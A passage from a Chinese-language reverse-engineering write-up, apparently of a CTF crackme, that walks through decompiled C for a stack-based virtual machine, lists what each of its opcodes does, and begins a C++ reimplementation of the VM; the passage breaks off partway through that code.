)</span><br><span class="line">&#123;</span><br><span class="line">    v9 = &amp;v2-&gt;val;</span><br><span class="line">    v2 = v2-&gt;next;</span><br><span class="line">    v7 = *v9;</span><br><span class="line">    <span class="built_in">free</span>(v9);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = &amp;v2-&gt;val;</span><br><span class="line">        v2 = v2-&gt;next;</span><br><span class="line">        v8 = *v10;</span><br><span class="line">        <span class="built_in">free</span>(v10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = <span class="number">0x80000000</span>;</span><br><span class="line">    v8 = <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">v11-&gt;val = v7 % v8;</span><br><span class="line"><span class="keyword">goto</span> LABEL_53;</span><br></pre></td></tr></table></figure><p>可以说，基本上是一目了然了，并且据此可以联想到一个栈的结果，将两个数 push 进栈中，再弹出来做计算，计算的结果重新入栈。</p><p>这里可以将所有 malloc 返回值接收的变量都改成 <code>LinkEntry *</code> 类型。</p><p>此时再来观察整个反编译的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vmrun</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *vmcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  LinkEntry *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> opcode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">char</span> *PC; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v10; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  LinkEntry *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v14; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v17; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v18; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v19; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v20; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v22; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v23; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// ebx</span></span><br><span class="line">  LinkEntry *v26; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> *v30; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v31; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v33; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v34; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v35; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v36; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v38; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v39; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v40; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v41; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v42; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v43; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v44; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v45; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v48; <span class="comment">// [rsp+58h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  opcode = *vmcode - <span class="number">16</span>;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  PC = vmcode + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( opcode )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          <span class="built_in">free</span>(v9);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0x80000000</span>;</span><br><span class="line">          v8 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v11-&gt;val = v7 % v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v12 = *PC;</span><br><span class="line">        v13 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        ++PC;</span><br><span class="line">        v13-&gt;next = v2;</span><br><span class="line">        v2 = v13;</span><br><span class="line">        v13-&gt;val = v12;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v5 = *v14;</span><br><span class="line">          <span class="built_in">free</span>(v14);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v15 = *v17;</span><br><span class="line">          <span class="built_in">free</span>(v17);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v18 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v16 = *v18;</span><br><span class="line">            <span class="built_in">free</span>(v18);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v16 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0x80000000</span>;</span><br><span class="line">          v16 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v19 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v19-&gt;next = v2;</span><br><span class="line">        v2 = v19;</span><br><span class="line">        v19-&gt;val = v15 * v16;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v22 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v20 = *v22;</span><br><span class="line">          <span class="built_in">free</span>(v22);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v23 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v21 = *v23;</span><br><span class="line">            <span class="built_in">free</span>(v23);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v21 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v20 = <span class="number">0x80000000</span>;</span><br><span class="line">          v21 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v24 = v21 + v20;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_52;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sub_1400011B0(<span class="string">&quot;%c&quot;</span>, v5);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        v25 = *input;</span><br><span class="line">        v26 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v26-&gt;next = v2;</span><br><span class="line">        v2 = v26;</span><br><span class="line">        v26-&gt;val = v25;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v27 = *v29;</span><br><span class="line">          <span class="built_in">free</span>(v29);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v30 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v28 = *v30;</span><br><span class="line">            <span class="built_in">free</span>(v30);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v28 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LOBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">          v28 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v31 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v31-&gt;next = v2;</span><br><span class="line">        v2 = v31;</span><br><span class="line">        v31-&gt;val = (v28 &gt;&gt; v27) &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v34 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v32 = *v34;</span><br><span class="line">          <span class="built_in">free</span>(v34);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v35 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v33 = *v35;</span><br><span class="line">            <span class="built_in">free</span>(v35);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v33 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v32 = <span class="number">0x80000000</span>;</span><br><span class="line">          v33 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v36 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v36-&gt;next = v2;</span><br><span class="line">        v2 = v36;</span><br><span class="line">        v36-&gt;val = v32 ^ v33;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        ++input;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v39 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v37 = *v39;</span><br><span class="line">          <span class="built_in">free</span>(v39);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v40 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v38 = *v40;</span><br><span class="line">            <span class="built_in">free</span>(v40);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v38 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v37 = <span class="number">0x80000000</span>;</span><br><span class="line">          v38 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v41 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v41-&gt;next = v2;</span><br><span class="line">        v2 = v41;</span><br><span class="line">        v41-&gt;val = v37 - v38;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v44 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v42 = *v44;</span><br><span class="line">          <span class="built_in">free</span>(v44);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v45 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v43 = *v45;</span><br><span class="line">            <span class="built_in">free</span>(v45);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v43 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v42 = <span class="number">0x80000000</span>;</span><br><span class="line">          v43 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v24 = v42 / v43;</span><br><span class="line">LABEL_52:</span><br><span class="line">        v11-&gt;val = v24;</span><br><span class="line">LABEL_53:</span><br><span class="line">        v11-&gt;next = v2;</span><br><span class="line">        v2 = v11;</span><br><span class="line">LABEL_54:</span><br><span class="line">        v46 = *PC++;</span><br><span class="line">        opcode = v46 - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> ( opcode &lt;= <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_57:</span><br><span class="line">        sub_1400011B0(<span class="string">&quot;WTF are u doinggg...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p><ul><li>0：取模操作（先弹出的值在运算符左侧）</li><li>1：push 操作</li><li>2：pop 操作</li><li>3：乘法操作</li><li>4：加法操作</li><li>5：输出</li><li>6：取输入指针</li><li>7：右移位后取最低位（先弹出的值在运算符右侧）</li><li>8：异或操作</li><li>9：输入指针+1</li><li>10：返回</li><li>11：减法操作（先弹出的值在运算符左侧）</li><li>12：除法操作（先弹出的值在运算符左侧）</li></ul><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>同时可以根据操作自己实现虚拟机，这里已经很清楚是栈的数据结构了就直接用 <code>std::stack</code> 实现即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt;s;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">0x10000</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getstackval</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> val=<span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">val=s.<span class="built_in">top</span>();</span><br><span class="line">s.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushstackval</span><span class="params">(<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;push val 